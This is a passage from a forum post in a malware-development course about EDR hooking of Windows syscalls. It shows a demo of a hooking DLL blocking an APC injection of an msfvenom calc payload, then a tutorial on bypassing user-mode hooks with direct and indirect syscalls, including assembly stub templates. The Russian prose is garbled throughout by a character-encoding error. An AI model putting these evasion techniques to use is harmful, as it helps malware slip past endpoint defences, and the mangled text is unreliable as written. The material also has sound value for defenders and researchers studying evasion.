—Ç–æ–≥–æ, —Ä–µ—à–µ–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –º–æ–≥—É—Ç –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –ª—é–±–æ–º—É —É—á–∞—Å—Ç–∫—É –ø–∞–º—è—Ç–∏, —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–º—É –∫–∞–∫ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π, –∏ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞—Ç—å –µ–≥–æ –≤ –ø–æ–∏—Å–∫–∞—Ö —Å–∏–≥–Ω–∞—Ç—É—Ä. –ü–µ—Ä–µ—Ö–≤–∞—Ç—á–∏–∫–∏ –≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–º —Ä–µ–∂–∏–º–µ –æ–±—ã—á–Ω–æ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é—Ç—Å—è –ø–µ—Ä–µ–¥ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–µ–π —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –∫–æ—Ç–æ—Ä–∞—è —è–≤–ª—è–µ—Ç—Å—è –ø–æ—Å–ª–µ–¥–Ω–∏–º —à–∞–≥–æ–º –¥–ª—è —Ñ—É–Ω–∫—Ü–∏–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–º —Ä–µ–∂–∏–º–µ.<br />
<br />
–ü–µ—Ä–µ—Ö–≤–∞—Ç—á–∏–∫–∏ –≤ —Ä–µ–∂–∏–º–µ —è–¥—Ä–∞ –º–æ–≥—É—Ç –±—ã—Ç—å —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω—ã –ø–æ—Å–ª–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è, <b>–ø–æ—Å–ª–µ –ø–µ—Ä–µ–¥–∞—á–∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è —è–¥—Ä—É.</b> –û–¥–Ω–∞–∫–æ Windows Patch Guard –∏ –¥—Ä—É–≥–∏–µ —Å—Ä–µ–¥—Å—Ç–≤–∞ –∑–∞—â–∏—Ç—ã –¥–µ–ª–∞—é—Ç —Å–ª–æ–∂–Ω–æ–π –∏–ª–∏ –¥–∞–∂–µ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ–π –∑–∞–¥–∞—á—É –∏–∑–º–µ–Ω–µ–Ω–∏—è –ø–∞–º—è—Ç–∏ —è–¥—Ä–∞ —Å—Ç–æ—Ä–æ–Ω–Ω–∏–º–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è–º–∏. –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø–µ—Ä–µ—Ö–≤–∞—Ç—á–∏–∫–æ–≤ –≤ —Ä–µ–∂–∏–º–µ —è–¥—Ä–∞ –º–æ–∂–µ—Ç —Ç–∞–∫–∂–µ –ø—Ä–∏–≤–µ—Å—Ç–∏ –∫ –ø—Ä–æ–±–ª–µ–º–∞–º —Å—Ç–∞–±–∏–ª—å–Ω–æ—Å—Ç–∏ –∏ –≤—ã–∑–≤–∞—Ç—å –Ω–µ–æ–∂–∏–¥–∞–Ω–Ω–æ–µ –ø–æ–≤–µ–¥–µ–Ω–∏–µ, <b><u>–ø–æ—ç—Ç–æ–º—É –æ–Ω–∞ —Ä–µ–¥–∫–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è.</u><br />
<br />
–ü—Ä–∏–º–µ—Ä –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–º —Ä–µ–∂–∏–º–µ</b><br />
<br />
–í —ç—Ç–æ–º —Ä–∞–∑–¥–µ–ª–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Ñ–∞–π–ª DLL, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–∏ –≤–Ω–µ–¥—Ä–µ–Ω–∏–∏ –≤ –ø—Ä–æ—Ü–µ—Å—Å –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –±–∏–±–ª–∏–æ—Ç–µ–∫—É Minhook –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –Ω–∞ NtProtectVirtualMemory —Å —Ü–µ–ª—å—é –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –¥–µ–π—Å—Ç–≤–∏—è—Ö EDR –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω–æ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞. –£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–π –ø–µ—Ä–µ—Ö–≤–∞—Ç—á–∏–∫ –æ–±–ª–∞–¥–∞–µ—Ç –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å—é –≤—ã–≤–æ–¥–∞ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ –ø–∞–º—è—Ç–∏ –Ω–∞ —ç–∫—Ä–∞–Ω –≤ –∫–æ–Ω—Å–æ–ª—å, –µ—Å–ª–∏ –æ–Ω —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –∫–∞–∫ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π (RX –∏–ª–∏ RWX). –ö—Ä–æ–º–µ —Ç–æ–≥–æ, –ø—Ä–æ—Ü–µ—Å—Å –±—É–¥–µ—Ç –∑–∞–≤–µ—Ä—à–µ–Ω, –µ—Å–ª–∏ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞ –æ–±–ª–∞—Å—Ç—å –ø–∞–º—è—Ç–∏ RWX.<br />
<br />
<b>–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ EDR<br />
<br />
<span style="color: rgb(184, 49, 47)">–≠—Ç–æ –ø—Ä–æ—Å—Ç–æ –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è, –∫–∞–∫ –ø–µ—Ä–µ—Ö–≤–∞—Ç NtProtectVirtualMemory –º–æ–∂–µ—Ç –∑–∞—â–∏—Ç–∏—Ç—å –æ—Ç –∏–Ω—ä–µ–∫—Ü–∏–∏, –∫–æ–¥ –ø–æ–∫–∞ –Ω–µ –ø—Ä–∏–≤–æ–¥–∏—Ç—Å—è.<br />
–†–µ–∫–æ–º–µ–Ω–¥—É—é –ø–æ—Ç—Ä–µ–Ω–∏—Ä–æ–≤–∞—Ç—å—Å—è —Å–∞–º–æ–º—É.<br />
–ö–∞–∫ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—Ç—å –ø–µ—Ä–µ—Ö–≤–∞—Ç –º–æ–∂–Ω–æ –ø–æ—á–∏—Ç–∞—Ç—å –∑–¥–µ—Å—å:–ö—É–Ω–≥—Ñ—É-2.–ò–∑—É—á–∞–µ–º API Hooking | –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot;</span></b><br />
<br />
–≠—Ç–æ—Ç —Ä–∞–∑–¥–µ–ª –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É–µ—Ç, –∫–∞–∫ EDR –º–æ–∂–µ—Ç –±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–≥–æ –ø–æ–ª–µ–∑–Ω–æ–≥–æ –∫–æ–¥–∞ —Å –ø–æ–º–æ—â—å—é –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞. –í —ç—Ç–æ–π –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–º –±–∏–Ω–∞—Ä–Ω—ã–º —Ñ–∞–π–ª–æ–º –±—É–¥–µ—Ç –∫–æ–¥ –≤–Ω–µ–¥—Ä–µ–Ω–∏—è APC (–ò–∑—É—á–∞–µ–º —Ç–µ—Ö–Ω–∏–∫—É APC Injection).<br />
<br />
–ó–∞–ø—É—Å–∫ –ø—Ä–æ–≥—Ä–∞–º–º—ã –±–µ–∑ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ NtProtectVirtualMemory.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785418328.png"
		data-src="https://osint42.org/attachments/1746785418328-png.203/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785418328-png.203/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785418328.png"
			title="1746785418328.png"
			width="1283" height="487" loading="lazy" />
	</div><br />
<br />
–í–Ω–µ–¥—Ä–µ–Ω–∏–µ MalDevEdr.dll –≤ ApcInjection.exe, —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º Process Hacker. <b>–í MalDevEdr.dll —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –ø–µ—Ä–µ—Ö–≤–∞—Ç—á–∏–∫ NtProtectVirtualMemor</b>y.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785501313.png"
		data-src="https://osint42.org/attachments/1746785501313-png.204/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785501313-png.204/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785501313.png"
			title="1746785501313.png"
			width="1323" height="573" loading="lazy" />
	</div><br />
<br />
DLL –≤–Ω–µ–¥—Ä–µ–Ω–∞, –∏ –æ–Ω–∞ –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞–µ—Ç RX (—ç—Ç–æ —Å–≤—è–∑–∞–Ω–æ —Å –≤–Ω–µ–¥—Ä–µ–Ω–∏–µ–º DLL).<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785508015.png"
		data-src="https://osint42.org/attachments/1746785508015-png.205/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785508015-png.205/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785508015.png"
			title="1746785508015.png"
			width="1434" height="635" loading="lazy" />
	</div><br />
<br />
–ü—Ä–∏ –Ω–∞–∂–∞—Ç–∏–∏ –∫–ª–∞–≤–∏—à–∏ Enter –≤ –∫–æ–Ω—Å–æ–ª–∏ ApcInjection.exe –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è NtProtectVirtualMemory, —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—è 0x0000025041080000 –∫–∞–∫ –ø–∞–º—è—Ç—å RWX, —ç—Ç–æ—Ç –∞–¥—Ä–µ—Å –ø–∞–º—è—Ç–∏ –∑–∞—Ç–µ–º –≤—ã–≤–æ–¥–∏—Ç—Å—è –Ω–∞ —ç–∫—Ä–∞–Ω –≤ –∫–æ–Ω—Å–æ–ª—å.<br />
<br />
–í—ã–≤–µ–¥–µ–Ω–Ω–æ–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ - —ç—Ç–æ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ Msfvenom calc.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785515399.png"
		data-src="https://osint42.org/attachments/1746785515399-png.206/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785515399-png.206/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785515399.png"
			title="1746785515399.png"
			width="1129" height="828" loading="lazy" />
	</div><br />
<br />
<b>–û–±—ä—è—Å–Ω–µ–Ω–∏–µ</b><br />
<br />
–ö–æ–≥–¥–∞ ApcInjection.exe –∏—Å–ø–æ–ª—å–∑—É–µ—Ç VirtualProtect —Å –∞—Ä–≥—É–º–µ–Ω—Ç–æ–º PAGE_EXECUTE_READWRITE, –æ–Ω –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ—Ç—Å—è MalDevEdr.dll. MalDevEdr.dll –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å, –ø–µ—Ä–µ–¥–∞–Ω–Ω—ã–π VirtualProtect, –¥–ª—è —Å–±—Ä–æ—Å–∞ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ —ç—Ç–æ–π –æ–±–ª–∞—Å—Ç–∏ –ø–∞–º—è—Ç–∏. –¢–∞–∫ –∫–∞–∫ –æ–±–ª–∞—Å—Ç—å –ø–∞–º—è—Ç–∏ –∏–∑–º–µ–Ω—è–µ—Ç—Å—è –Ω–∞ RWX, MalDevEdr.dll –∑–∞–≤–µ—Ä—à–∞–µ—Ç –ø—Ä–æ–≥—Ä–∞–º–º—É –∏ –±–ª–æ–∫–∏—Ä—É–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏, —á–µ–≥–æ –Ω–µ —Å–º–æ–≥ —Å–¥–µ–ª–∞—Ç—å Windows Defender Antivirus.<br />
<br />
<b>–≠—Ç–æ—Ç –∫–æ–Ω—Ü–µ–ø—Ç—É–∞–ª—å–Ω—ã–π –ø—Ä–∏–º–µ—Ä –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É–µ—Ç –º–æ—â—å –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ API –≤ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏–∏ –∏ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏.</b> –í —Ä–µ–∞–ª—å–Ω—ã—Ö —É—Å–ª–æ–≤–∏—è—Ö EDR –æ–±—ã—á–Ω–æ –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ—Ç –±–æ–ª–µ–µ —à–∏—Ä–æ–∫–∏–π –¥–∏–∞–ø–∞–∑–æ–Ω —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤, —É–ª—É—á—à–∞—è —Å–≤–æ—é —Å–ø–æ—Å–æ–±–Ω–æ—Å—Ç—å –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è.<br />
<br />
<b>–û–±—Ö–æ–¥ –ø–µ—Ä–µ—Ö–≤–∞—Ç—á–∏–∫–æ–≤ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ –≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–º —Ä–µ–∂–∏–º–µ<br />
<br />
–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ –Ω–∞–ø—Ä—è–º—É—é</b> —è–≤–ª—è–µ—Ç—Å—è –æ–¥–Ω–∏–º –∏–∑ —Å–ø–æ—Å–æ–±–æ–≤ –æ–±—Ö–æ–¥–∞ –ø–µ—Ä–µ—Ö–≤–∞—Ç—á–∏–∫–æ–≤ –≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–º —Ä–µ–∂–∏–º–µ. –ù–∞–ø—Ä–∏–º–µ—Ä, –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ NtAllocateVirtualMemory –≤–º–µ—Å—Ç–æ VirtualAlloc/Ex WinAPI –ø—Ä–∏ –≤—ã–¥–µ–ª–µ–Ω–∏–∏ –ø–∞–º—è—Ç–∏ –¥–ª—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏. –ï—Å—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –¥—Ä—É–≥–∏—Ö —Å–ø–æ—Å–æ–±–æ–≤, –∫–æ—Ç–æ—Ä—ã–º–∏ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã –º–æ–≥—É—Ç –±—ã—Ç—å –≤—ã–∑–≤–∞–Ω—ã –Ω–µ–∑–∞–º–µ—Ç–Ω–æ:<br />
<br />
–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø—Ä—è–º—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤.<br />
–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ—Å–≤–µ–Ω–Ω—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤.<br />
–°–Ω—è—Ç–∏–µ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞.<br />
<br />
<b>–ü—Ä—è–º—ã–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã</b><br />
<br />
–û–±—Ö–æ–¥ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ –≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–º —Ä–µ–∂–∏–º–µ –º–æ–∂–Ω–æ –¥–æ—Å—Ç–∏—á—å, –ø–æ–ª—É—á–∏–≤ –≤–µ—Ä—Å–∏—é —Ñ—É–Ω–∫—Ü–∏–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –∑–∞–ø–∏—Å–∞–Ω–Ω—É—é –Ω–∞ —è–∑—ã–∫–µ –∞—Å—Å–µ–º–±–ª–µ—Ä–∞, –∏ –≤—ã–∑–≤–∞–≤ —ç—Ç–æ—Ç —Å–æ–∑–¥–∞–Ω–Ω—ã–π —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ –Ω–∞–ø—Ä—è–º—É—é –∏–∑ —Ñ–∞–π–ª–∞ –∞—Å—Å–µ–º–±–ª–µ—Ä–∞. –ó–∞–¥–∞—á–∞ –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–∏ –Ω–æ–º–µ—Ä–∞ —Å–ª—É–∂–±—ã —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ (SSN), —Ç–∞–∫ –∫–∞–∫ —ç—Ç–æ—Ç –Ω–æ–º–µ—Ä –º–µ–Ω—è–µ—Ç—Å—è –æ—Ç –æ–¥–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∫ –¥—Ä—É–≥–æ–π. –ß—Ç–æ–±—ã –ø—Ä–µ–æ–¥–æ–ª–µ—Ç—å —ç—Ç–æ, SSN –º–æ–∂–µ—Ç –±—ã—Ç—å –ª–∏–±–æ –∂–µ—Å—Ç–∫–æ –∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω –≤ —Ñ–∞–π–ª–µ –∞—Å—Å–µ–º–±–ª–µ—Ä–∞, –ª–∏–±–æ –≤—ã—á–∏—Å–ª–µ–Ω –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏ –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è.<br />
<br />
–û–±—Ä–∞–∑–µ—Ü —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –≤ —Ñ–∞–π–ª–µ –∞—Å—Å–µ–º–±–ª–µ—Ä–∞ (.asm) –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, (ssn of NtAllocateVirtualMemory)
    syscall
    ret
NtAllocateVirtualMemory ENDP

NtProtectVirtualMemory PROC
    mov r10, rcx
    mov eax, (ssn of NtProtectVirtualMemory)
    syscall
    ret
NtProtectVirtualMemory ENDP

// –¥—Ä—É–≥–∏–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã...</code></pre>
	</div>
</div><br />
–í–º–µ—Å—Ç–æ –≤—ã–∑–æ–≤–∞ NtAllocateVirtualMemory —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º GetProcAddress –∏ GetModuleHandle, –∫–∞–∫ —ç—Ç–æ –±—ã–ª–æ —Å–¥–µ–ª–∞–Ω–æ —Ä–∞–Ω–µ–µ –≤ —ç—Ç–æ–º –∫—É—Ä—Å–µ, –Ω–∏–∂–µ—Å–ª–µ–¥—É—é—â—É—é —Ñ—É–Ω–∫—Ü–∏—é –∞—Å—Å–µ–º–±–ª–µ—Ä–∞ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ç–æ–≥–æ –∂–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞. –≠—Ç–æ –∏—Å–∫–ª—é—á–∞–µ—Ç –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç—å –≤—ã–∑—ã–≤–∞—Ç—å NtAllocateVirtualMemory –∏–∑ –∞–¥—Ä–µ—Å–Ω–æ–≥–æ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–∞ NTDLL, –≥–¥–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã –ø–µ—Ä–µ—Ö–≤–∞—Ç—á–∏–∫–∏, —Ç–µ–º —Å–∞–º—ã–º –∏–∑–±–µ–≥–∞—è —ç—Ç–∏—Ö –ø–µ—Ä–µ—Ö–≤–∞—Ç—á–∏–∫–æ–≤.<br />
<br />
–≠—Ç–æ—Ç –º–µ—Ç–æ–¥ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞—Ö, —Ç–∞–∫–∏—Ö –∫–∞–∫ <a href="https://github.com/jthuraisamy/SysWhispers" target="_blank" class="link link--external" rel="noopener">SysWhispers</a> –∏ <a href="https://github.com/am0nsec/HellsGate" target="_blank" class="link link--external" rel="noopener">HellsGate</a>, –æ–±—Å—É–∂–¥–µ–Ω–∏–µ –∫–æ—Ç–æ—Ä—ã—Ö –±—É–¥–µ—Ç –ø–æ–∑–∂–µ –≤ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ.<br />
<br />
<b>–ö–æ—Å–≤–µ–Ω–Ω—ã–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã</b><br />
<br />
–ö–æ—Å–≤–µ–Ω–Ω—ã–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã —Ä–µ–∞–ª–∏–∑—É—é—Ç—Å—è –∞–Ω–∞–ª–æ–≥–∏—á–Ω–æ –ø—Ä—è–º—ã–º —Å–∏—Å—Ç–µ–º–Ω—ã–º –≤—ã–∑–æ–≤–∞–º, –≥–¥–µ —Ñ–∞–π–ª—ã –Ω–∞ —è–∑—ã–∫–µ –∞—Å—Å–µ–º–±–ª–µ—Ä–∞ –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å —Å–æ–∑–¥–∞–Ω—ã –≤—Ä—É—á–Ω—É—é. –†–∞–∑–ª–∏—á–∏–µ –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ –æ—Ç—Å—É—Ç—Å—Ç–≤–∏–∏ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –≤–Ω—É—Ç—Ä–∏ —Ñ—É–Ω–∫—Ü–∏–∏ –Ω–∞ —è–∑—ã–∫–µ –∞—Å—Å–µ–º–±–ª–µ—Ä–∞, –∫ –∫–æ—Ç–æ—Ä–æ–π –≤–º–µ—Å—Ç–æ —ç—Ç–æ–≥–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –ø–µ—Ä–µ—Ö–æ–¥.<br />
<br />
–í–∏–∑—É–∞–ª—å–Ω–æ–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–æ –Ω–∏–∂–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785533317.png"
		data-src="https://osint42.org/attachments/1746785533317-png.207/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785533317-png.207/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785533317.png"
			title="1746785533317.png"
			width="1263" height="657" loading="lazy" />
	</div><br />
<br />
–§—É–Ω–∫—Ü–∏–∏ –Ω–∞ —è–∑—ã–∫–µ –∞—Å—Å–µ–º–±–ª–µ—Ä–∞ –¥–ª—è NtAllocateVirtualMemory –∏ NtProtectVirtualMemory –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω—ã –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, (ssn of NtAllocateVirtualMemory)
    jmp (address of a syscall instruction)
    ret
NtAllocateVirtualMemory ENDP

NtProtectVirtualMemory PROC
    mov r10, rcx
    mov eax, (ssn of NtProtectVirtualMemory)
    jmp (address of a syscall instruction)
    ret
NtProtectVirtualMemory ENDP

// –¥—Ä—É–≥–∏–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã...</code></pre>
	</div>
</div><br />
<b>–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞ –∫–æ—Å–≤–µ–Ω–Ω—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤</b><br />
<br />
–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ—Å–≤–µ–Ω–Ω—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ –ø–µ—Ä–µ–¥ –ø—Ä—è–º—ã–º–∏ —Å–∏—Å—Ç–µ–º–Ω—ã–º–∏ –≤—ã–∑–æ–≤–∞–º–∏ –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —Ç–æ–º, —á—Ç–æ —Ä–µ—à–µ–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –±—É–¥—É—Ç –∏—Å–∫–∞—Ç—å —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã, –≤—ã–∑—ã–≤–∞–µ–º—ã–µ –∏–∑-–∑–∞ –ø—Ä–µ–¥–µ–ª–æ–≤ –∞–¥—Ä–µ—Å–Ω–æ–≥–æ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–∞ NTDLL, –∏ —Å—á–∏—Ç–∞—Ç—å –∏—Ö –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–º–∏. –° –∫–æ—Å–≤–µ–Ω–Ω—ã–º–∏ —Å–∏—Å—Ç–µ–º–Ω—ã–º–∏ –≤—ã–∑–æ–≤–∞–º–∏ 